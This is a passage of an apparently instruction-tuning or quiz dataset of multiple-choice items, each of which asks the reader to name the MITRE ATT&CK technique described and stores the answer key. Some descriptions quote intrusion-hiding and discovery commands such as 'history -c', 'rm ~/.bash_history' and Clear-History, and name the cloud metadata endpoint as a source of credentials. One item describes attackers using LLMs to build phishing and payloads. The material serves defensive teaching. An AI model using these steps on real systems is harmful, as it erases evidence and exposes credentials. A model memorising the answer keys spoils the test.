ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.\nA. Develop Capabilities: Digital Certificates, B. Indicator Removal: Clear Command History, C. Event Triggered Execution: Windows Management Instrumentation Event Subscription, D. OS Credential Dumping: LSA Secrets\nAnswer:",
    "context": "",
    "output": "B. Indicator Removal: Clear Command History",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nIn addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a Network Device CLI on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.",
      "options": "A. Develop Capabilities: Digital Certificates, B. Indicator Removal: Clear Command History, C. Event Triggered Execution: Windows Management Instrumentation Event Subscription, D. OS Credential Dumping: LSA Secrets",
      "choice": "B. Indicator Removal: Clear Command History",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL Search Order Hijacking.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors.   If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\nOptions:\nA. Data Manipulation, B. Hijack Execution Flow: Executable Installer File Permissions Weakness, C. Compromise Infrastructure: Web Services, D. Ingress Tool Transfer",
    "context": "",
    "output": "B. Hijack Execution Flow: Executable Installer File Permissions Weakness",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL Search Order Hijacking.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors.   If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
      "options": "A. Data Manipulation, B. Hijack Execution Flow: Executable Installer File Permissions Weakness, C. Compromise Infrastructure: Web Services, D. Ingress Tool Transfer",
      "choice": "B. Hijack Execution Flow: Executable Installer File Permissions Weakness",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.\n\nPossible answers:\nA. Command and Scripting Interpreter: Windows Command Shell, B. Credentials from Password Stores: Cloud Secrets Management Stores, C. Obfuscated Files or Information: Binary Padding, D. Brute Force: Credential Stuffing",
    "context": "",
    "output": "C. Obfuscated Files or Information: Binary Padding",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.",
      "options": "A. Command and Scripting Interpreter: Windows Command Shell, B. Credentials from Password Stores: Cloud Secrets Management Stores, C. Obfuscated Files or Information: Binary Padding, D. Brute Force: Credential Stuffing",
      "choice": "C. Obfuscated Files or Information: Binary Padding",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user\u2019s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB. IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.\n\nA. Taint Shared Content, B. Modify Registry, C. Compromise Accounts: Email Accounts, D. Email Collection: Local Email Collection\nAnswer:",
    "context": "",
    "output": "D. Email Collection: Local Email Collection",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user\u2019s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB. IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.",
      "options": "A. Taint Shared Content, B. Modify Registry, C. Compromise Accounts: Email Accounts, D. Email Collection: Local Email Collection",
      "choice": "D. Email Collection: Local Email Collection",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.\n\nOptions:\nA. Application Layer Protocol: Mail Protocols, B. Command and Scripting Interpreter: Cloud API, C. Access Token Manipulation, D. Modify Authentication Process: Domain Controller Authentication",
    "context": "",
    "output": "A. Application Layer Protocol: Mail Protocols",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "options": "A. Application Layer Protocol: Mail Protocols, B. Command and Scripting Interpreter: Cloud API, C. Access Token Manipulation, D. Modify Authentication Process: Domain Controller Authentication",
      "choice": "A. Application Layer Protocol: Mail Protocols",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. Bash History), operating system or application-specific repositories (e.g. Credentials in Registry),  or other specialized files/artifacts (e.g. Private Keys).\n\nPossible answers:\nA. Account Manipulation: Additional Email Delegate Permissions, B. Unsecured Credentials, C. File and Directory Discovery, D. Multi-Factor Authentication Interception",
    "context": "",
    "output": "B. Unsecured Credentials",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. Bash History), operating system or application-specific repositories (e.g. Credentials in Registry),  or other specialized files/artifacts (e.g. Private Keys).",
      "options": "A. Account Manipulation: Additional Email Delegate Permissions, B. Unsecured Credentials, C. File and Directory Discovery, D. Multi-Factor Authentication Interception",
      "choice": "B. Unsecured Credentials",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user\u2019s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (`.desktop`) to configure the user\u2019s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.\n\nAdversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the `Exec` directive in the `.desktop` configuration file. When the user\u2019s desktop environment is loaded at user login, the `.desktop` files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart` directory.\n\nAdversaries may combine this technique with Masquerading to blend malicious Autostart entries with legitimate programs.\n\nPossible answers:\nA. Boot or Logon Autostart Execution: XDG Autostart Entries, B. Hide Artifacts: NTFS File Attributes, C. Hijack Execution Flow: Services File Permissions Weakness, D. Compromise Infrastructure: Domains",
    "context": "",
    "output": "A. Boot or Logon Autostart Execution: XDG Autostart Entries",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user\u2019s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (`.desktop`) to configure the user\u2019s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.\n\nAdversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the `Exec` directive in the `.desktop` configuration file. When the user\u2019s desktop environment is loaded at user login, the `.desktop` files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart` directory.\n\nAdversaries may combine this technique with Masquerading to blend malicious Autostart entries with legitimate programs.",
      "options": "A. Boot or Logon Autostart Execution: XDG Autostart Entries, B. Hide Artifacts: NTFS File Attributes, C. Hijack Execution Flow: Services File Permissions Weakness, D. Compromise Infrastructure: Domains",
      "choice": "A. Boot or Logon Autostart Execution: XDG Autostart Entries",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks including conducting Reconnaissance, creating basic scripts, assisting social engineering, and even developing payloads.\n\nFor example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in Phishing/Phishing for Information campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting Develop Capabilities. AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., Obfuscated Files or Information) malicious scripts and payloads.\nA. Data from Local System, B. Virtualization/Sandbox Evasion: Time Based Evasion, C. Process Injection, D. Obtain Capabilities: Artificial Intelligence",
    "context": "",
    "output": "D. Obtain Capabilities: Artificial Intelligence",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks including conducting Reconnaissance, creating basic scripts, assisting social engineering, and even developing payloads.\n\nFor example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in Phishing/Phishing for Information campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting Develop Capabilities. AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., Obfuscated Files or Information) malicious scripts and payloads.",
      "options": "A. Data from Local System, B. Virtualization/Sandbox Evasion: Time Based Evasion, C. Process Injection, D. Obtain Capabilities: Artificial Intelligence",
      "choice": "D. Obtain Capabilities: Artificial Intelligence",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.\n\nIn addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals. In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).\n\nAn adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).\nA. Obtain Capabilities: Exploits, B. Command and Scripting Interpreter: AutoHotKey & AutoIT, C. Modify Authentication Process, D. Virtualization/Sandbox Evasion: System Checks\nAnswer:",
    "context": "",
    "output": "A. Obtain Capabilities: Exploits",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.\n\nIn addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals. In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).\n\nAn adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).",
      "options": "A. Obtain Capabilities: Exploits, B. Command and Scripting Interpreter: AutoHotKey & AutoIT, C. Modify Authentication Process, D. Virtualization/Sandbox Evasion: System Checks",
      "choice": "A. Obtain Capabilities: Exploits",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAn adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.\n\nA. Search Open Websites/Domains: Social Media, B. User Execution: Malicious Link, C. External Remote Services, D. Obfuscated Files or Information: Encrypted/Encoded File\nA:",
    "context": "",
    "output": "B. User Execution: Malicious Link",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAn adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
      "options": "A. Search Open Websites/Domains: Social Media, B. User Execution: Malicious Link, C. External Remote Services, D. Obfuscated Files or Information: Encrypted/Encoded File",
      "choice": "B. User Execution: Malicious Link",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may the technique with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. Establish Accounts), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials. Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries may directly leverage compromised email accounts for Phishing for Information or Phishing.\n\nOptions:\nA. Modify Authentication Process: Network Device Authentication, B. Data Encoding: Non-Standard Encoding, C. Compromise Accounts, D. Drive-by Compromise",
    "context": "",
    "output": "C. Compromise Accounts",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may the technique with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. Establish Accounts), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials. Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries may directly leverage compromised email accounts for Phishing for Information or Phishing.",
      "options": "A. Modify Authentication Process: Network Device Authentication, B. Data Encoding: Non-Standard Encoding, C. Compromise Accounts, D. Drive-by Compromise",
      "choice": "C. Compromise Accounts",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance. A cloud metadata API has been used in at least one high profile compromise.\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http://169.254.169.254</code>.\n\nOptions:\nA. Unsecured Credentials: Cloud Instance Metadata API, B. Defacement: External Defacement, C. Financial Theft, D. Masquerading: Rename System Utilities",
    "context": "",
    "output": "A. Unsecured Credentials: Cloud Instance Metadata API",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance. A cloud metadata API has been used in at least one high profile compromise.\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http://169.254.169.254</code>.",
      "options": "A. Unsecured Credentials: Cloud Instance Metadata API, B. Defacement: External Defacement, C. Financial Theft, D. Masquerading: Rename System Utilities",
      "choice": "A. Unsecured Credentials: Cloud Instance Metadata API",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol.   Net can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.\n\nA. Search Open Technical Databases: Digital Certificates, B. Gather Victim Host Information: Software, C. Network Share Discovery, D. System Network Configuration Discovery: Internet Connection Discovery\nAnswer:",
    "context": "",
    "output": "C. Network Share Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol.   Net can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.",
      "options": "A. Search Open Technical Databases: Digital Certificates, B. Gather Victim Host Information: Software, C. Network Share Discovery, D. System Network Configuration Discovery: Internet Connection Discovery",
      "choice": "C. Network Share Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.\n\nSSH Hijacking differs from use of SSH because it hijacks an existing SSH session rather than creating a new session using Valid Accounts.\n\nOptions:\nA. Modify Cloud Compute Infrastructure: Create Snapshot, B. Exfiltration Over Web Service: Exfiltration to Code Repository, C. Event Triggered Execution: Windows Management Instrumentation Event Subscription, D. Remote Service Session Hijacking: SSH Hijacking",
    "context": "",
    "output": "D. Remote Service Session Hijacking: SSH Hijacking",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.\n\nSSH Hijacking differs from use of SSH because it hijacks an existing SSH session rather than creating a new session using Valid Accounts.",
      "options": "A. Modify Cloud Compute Infrastructure: Create Snapshot, B. Exfiltration Over Web Service: Exfiltration to Code Repository, C. Event Triggered Execution: Windows Management Instrumentation Event Subscription, D. Remote Service Session Hijacking: SSH Hijacking",
      "choice": "D. Remote Service Session Hijacking: SSH Hijacking",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.\n\nAdversaries may manipulate a process PEB to evade defenses. For example, Process Hollowing can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the Native API <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.\n\nAdversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.\n\nThis behavior may also be combined with other tricks (such as Parent PID Spoofing) to manipulate or further evade process-based detections.\nA. Event Triggered Execution: Screensaver, B. Hide Artifacts: Process Argument Spoofing, C. Data Manipulation: Stored Data Manipulation, D. Hijack Execution Flow: Path Interception by Unquoted Path\nAnswer:",
    "context": "",
    "output": "B. Hide Artifacts: Process Argument Spoofing",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
